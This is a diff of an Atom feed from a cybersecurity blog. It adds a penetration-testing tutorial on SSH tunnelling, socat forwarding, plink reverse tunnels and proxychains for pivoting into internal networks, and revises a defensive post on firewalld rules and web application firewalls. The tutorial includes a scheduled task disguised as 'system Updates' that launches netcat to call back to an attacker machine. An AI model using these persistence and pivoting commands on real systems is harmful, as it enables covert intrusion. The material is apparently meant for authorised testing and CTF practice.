@@ -1,10 +1,85 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://cyber-rosh.github.io/musings/feed.xml" rel="self" type="application/atom+xml" /><link href="https://cyber-rosh.github.io/musings/" rel="alternate" type="text/html" /><updated>2021-06-02T16:49:44+05:30</updated><id>https://cyber-rosh.github.io/musings/feed.xml</id><title type="html">The Rosh</title><subtitle>This site is about collection of articles on anything related to Cyber Security.</subtitle><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><entry><title type="html">Ideas on Scaling up security architecture for deploying web Apps</title><link href="https://cyber-rosh.github.io/musings/web-apps/" rel="alternate" type="text/html" title="Ideas on Scaling up security architecture for deploying web Apps" /><published>2021-05-22T00:00:00+05:30</published><updated>2021-05-22T00:00:00+05:30</updated><id>https://cyber-rosh.github.io/musings/web-apps</id><content type="html" xml:base="https://cyber-rosh.github.io/musings/web-apps/">&lt;p&gt;One of our clients, a mid sized company, wanted to scale up the security architecture of their client facing website. As per the terms of reference, they wanted minimum disruption in their existing workflow. Having any kind of code review, penetration testing or code rewrite was not on the platter. Hmmm!!! we thought lets give it a shot. They have this typical architecture in which the website was hosted on Virtual Private Servers (VPS).&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.0">Jekyll</generator><link href="https://cyber-rosh.github.io/musings/feed.xml" rel="self" type="application/atom+xml" /><link href="https://cyber-rosh.github.io/musings/" rel="alternate" type="text/html" /><updated>2021-06-08T15:49:30+05:30</updated><id>https://cyber-rosh.github.io/musings/feed.xml</id><title type="html">The Rosh</title><subtitle>This site is about collection of articles on anything related to Cyber Security.</subtitle><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><entry><title type="html">Understanding SSH Tunnelling and Proxychains</title><link href="https://cyber-rosh.github.io/musings/ssh-tunnel/" rel="alternate" type="text/html" title="Understanding SSH Tunnelling and Proxychains" /><published>2021-06-07T00:00:00+05:30</published><updated>2021-06-07T00:00:00+05:30</updated><id>https://cyber-rosh.github.io/musings/ssh-tunnel</id><content type="html" xml:base="https://cyber-rosh.github.io/musings/ssh-tunnel/">&lt;p&gt;Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.&lt;/p&gt;
+
+&lt;h1 id=&quot;problem-statement&quot;&gt;Problem Statement&lt;/h1&gt;
+&lt;p&gt;We have gained an initial foothold on one of the internal system of an organization. Now, we want to pivot to other systems and for this we require to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; scans on the internal networks. May be the organization is also running an internally hosted website which is not accessible from outside.How do we expose the internal ports/traffic to the outside attacker machine so that we can run our tools and gain access to resources which are not exposed to the outside world?&lt;/p&gt;
+
+&lt;h1 id=&quot;setup&quot;&gt;Setup&lt;/h1&gt;
+&lt;p&gt;The setup is given in figure below:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../assets/images/2021-06-07-ssh-tunnel-fig-1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;
+For our penetration testing of the website we have been given a PC where we can setup the proxy. In penetration testing terms let’s call it a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;victim&lt;/code&gt; PC.&lt;/p&gt;
+
+&lt;h1 id=&quot;actions-at-victim-machine&quot;&gt;Actions at Victim Machine&lt;/h1&gt;
+&lt;h2 id=&quot;step-1-optional&quot;&gt;Step 1 (Optional):&lt;/h2&gt;
+&lt;p&gt;Let us assume,we have made an entry into the task scheduler of the victim machine. It will run the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netcat.exe&lt;/code&gt; once it boots up and will connect with the listener running in the Kali machine.&lt;/p&gt;
+
+&lt;p&gt;Let’s make the task scheduler entry, to run the task once a day&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Make entry in task scheduler
+ SCHTASKS /CREATE /SC DAILY /TN &quot;SystemTask\system Updates&quot; /TR &quot;c:\Users\Dell\AppData\Roaming\WinUpdate\netcat.exe&quot; /ST 10:00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;step-2&quot;&gt;Step 2:&lt;/h2&gt;
+&lt;p&gt;Once, we get the victim machine command prompt back to our Kali machine, we will start the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;socate.exe&lt;/code&gt;. This program will forward the traffic to its local port:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;socate.exe TCP-LISTEN:8080,fork,reuseaddr TCP:&amp;lt;target-server-ip&amp;gt;:443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Once the traffic has been forwarded to a specific port, in our case &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt;, we can verify the same through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netstat&lt;/code&gt; command:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Now check if the port has been forwarded
+netstat -ano // check connection
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;step-3&quot;&gt;Step 3:&lt;/h2&gt;
+&lt;p&gt;We will redirect the traffic of the victim PC to the Virtual Private Server (VPS) through SSH tunnel, using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;plink.exe&lt;/code&gt; for windows.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Connect with VPS
+plink.exe -l &amp;lt;username&amp;gt; -pw &amp;lt;password&amp;gt; -R 8080:127.0.0.1:8080 &amp;lt;vps ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;actions-at-vps-machine&quot;&gt;Actions at VPS Machine&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# To check with curl
+/etc/hosts
+127.0.0.1 &amp;lt;domain-name&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;forward-traffic-to-kali-machine-from-vps&quot;&gt;Forward Traffic to Kali Machine from VPS&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# On Kali Machine
+ssh -g -L 8080:localhost:8080 -f -N &amp;lt;username&amp;gt;@&amp;lt;vps ip&amp;gt; // this use when want to open localhost
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;now-open-the-browser-and-enter&quot;&gt;Now open the browser and enter&lt;/h1&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://&amp;lt;domain-name&amp;gt;:8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;configure-socks5-proxy&quot;&gt;Configure SOCKS5 proxy&lt;/h1&gt;
+&lt;h2 id=&quot;actions-at-victim-machine-1&quot;&gt;Actions at victim machine&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;plink.exe -l &amp;lt;username&amp;gt; -pw &amp;lt;password&amp;gt; -D 8080:127.0.0.1:8080 &amp;lt;vps ip&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;actions-at-vps&quot;&gt;Actions at VPS&lt;/h2&gt;
+&lt;h3 id=&quot;install-proxychains&quot;&gt;Install proxychains&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ yum install proxychains
+$ nano /etc/proxychain.conf
+socks5 &amp;lt;vps-public-ip&amp;gt; 8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;check-on-terminal&quot;&gt;Check on terminal&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ proxychains curl www.myweb.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;on-kali-machine&quot;&gt;On Kali Machine&lt;/h2&gt;
+&lt;h3 id=&quot;do-settings-in-the-browser-if-we-want-to-open-websites-in-browser&quot;&gt;Do settings in the browser, if we want to open websites in browser&lt;/h3&gt;
+
+&lt;h3 id=&quot;in-case-you-want-to-use-terminal-for-traffic-and-not-browser-perform-following-steps&quot;&gt;In case you want to use terminal for traffic and not browser, perform following steps&lt;/h3&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ yum install proxychains
+
+# nano /etc/proxychain.conf
+socks5 &amp;lt;vps-public-ip&amp;gt; 8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h2 id=&quot;check-on-terminal-1&quot;&gt;Check on terminal&lt;/h2&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ proxychains curl www.myweb.com
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;reference&quot;&gt;Reference&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><summary type="html">Having a good knowledge on SSH tunnelling is an important tool in the arsenal for pentesting engagements and for playing networked Capture The Flag (CTF) events.</summary></entry><entry><title type="html">Ideas on Scaling up Security Architecture for Deploying Web Apps</title><link href="https://cyber-rosh.github.io/musings/web-apps/" rel="alternate" type="text/html" title="Ideas on Scaling up Security Architecture for Deploying Web Apps" /><published>2021-05-22T00:00:00+05:30</published><updated>2021-05-22T00:00:00+05:30</updated><id>https://cyber-rosh.github.io/musings/web-apps</id><content type="html" xml:base="https://cyber-rosh.github.io/musings/web-apps/">&lt;p&gt;Let us take a case of a mid sized company which wants to scale up its security architecture for the client facing website. As per the terms of reference, they want minimum disruption in their existing workflow and any kind of code rewrite is not on the platter. They have a classic deployment in which the website is hosted on Virtual Private Servers (VPS).&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;The first step we thought was to minimise the attack surface of our infrastructure which includes the website itself and the hosted environment and then to stop any malicious requests trying to directly hit the APIs.&lt;/p&gt;
+  &lt;p&gt;The first step is to minimize the attack surface by limiting access to the hosted infrastructure (VPS) for authorized traffic:ports &lt;em&gt;(TCP:443)&lt;/em&gt;. Thereafter, we can limit access to web APIs and monitor the incoming traffic on the exposed public APIs.&lt;/p&gt;
 &lt;/blockquote&gt;
 
-&lt;p&gt;Now, having worked out the design goals, we went about reworking the architecture. Of course there are many ways to go about the security architecture, but one of the ways was to introduce the following artifacts.&lt;/p&gt;
+&lt;p&gt;Now, having worked out the design goals, we can rework the architecture of our deployment. Of course there are many ways to go about the security architecture, but one of the ways was to enable/introduce the following artifacts.&lt;/p&gt;
 
 &lt;ul&gt;
   &lt;li&gt;Infrastructure Firewall&lt;/li&gt;
@@ -12,18 +87,20 @@
   &lt;li&gt;Web Application Firewall&lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;&lt;img src=&quot;../assets/images/2021-05-22-fig1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;../assets/images/2021-05-22-web-apps-fig-1.png&quot; alt=&quot;Deployment Architecture of Application&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;infrastructure-firewall&quot;&gt;Infrastructure Firewall&lt;/h2&gt;
 &lt;p&gt;The infrastructure firewall will take care that all traffic except that meant for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https&lt;/code&gt; is dropped at our Virtual Private Server (VPS). We can also configure the firewall in a way in which our proxy/load balancers are accessible from specific IPs/subnets. Some of the sample rules in our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;firewalld&lt;/code&gt; of CentOS7 as given here:&lt;/p&gt;
 
 &lt;p&gt;Firewalld Rules&lt;/p&gt;
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Create a trusted Zone having specific IP&lt;/span&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Step 1: Create a trusted Zone having whitelisted IP / subnet.&lt;/span&gt;
 firewall-cmd &lt;span class=&quot;nt&quot;&gt;--permanent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--add-source&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.10.10 &lt;span class=&quot;nt&quot;&gt;--zone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;trusted &amp;amp;
-&lt;span class=&quot;c&quot;&gt;# Add service http and https to the trusted zone&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Step 2: Add service http and https to the trusted zone&lt;/span&gt;
 firewall-cmd &lt;span class=&quot;nt&quot;&gt;--permanent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--add-service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http &lt;span class=&quot;nt&quot;&gt;--zone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;trusted &amp;amp;
 firewall-cmd &lt;span class=&quot;nt&quot;&gt;--permanent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--add-service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;https &lt;span class=&quot;nt&quot;&gt;--zone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;trusted &amp;amp;
-&lt;span class=&quot;c&quot;&gt;# Remove service http and https from the public zone&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Step 3: Remove service http and https from the public zone&lt;/span&gt;
 firewall-cmd &lt;span class=&quot;nt&quot;&gt;--permanent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--remove-service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;http &lt;span class=&quot;nt&quot;&gt;--zone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;public &amp;amp;
 firewall-cmd &lt;span class=&quot;nt&quot;&gt;--permanent&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--remove-service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;https &lt;span class=&quot;nt&quot;&gt;--zone&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;public &amp;amp;
 firewall-cmd &lt;span class=&quot;nt&quot;&gt;--reload&lt;/span&gt;
@@ -61,4 +138,4 @@ backend app2Servers
 &lt;ul&gt;
   &lt;li&gt;https://www.youtube.com/watch?v=qYnA2DFEELw&lt;/li&gt;
   &lt;li&gt;https://www.haproxy.com/blog/redirect-http-to-https-with-haproxy/&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><summary type="html">One of our clients, a mid sized company, wanted to scale up the security architecture of their client facing website. As per the terms of reference, they wanted minimum disruption in their existing workflow. Having any kind of code review, penetration testing or code rewrite was not on the platter. Hmmm!!! we thought lets give it a shot. They have this typical architecture in which the website was hosted on Virtual Private Servers (VPS).</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Jaimandeep Singh</name><email>karma.jaimandeep@gmail.com</email></author><summary type="html">Let us take a case of a mid sized company which wants to scale up its security architecture for the client facing website. As per the terms of reference, they want minimum disruption in their existing workflow and any kind of code rewrite is not on the platter. They have a classic deployment in which the website is hosted on Virtual Private Servers (VPS).</summary></entry></feed>
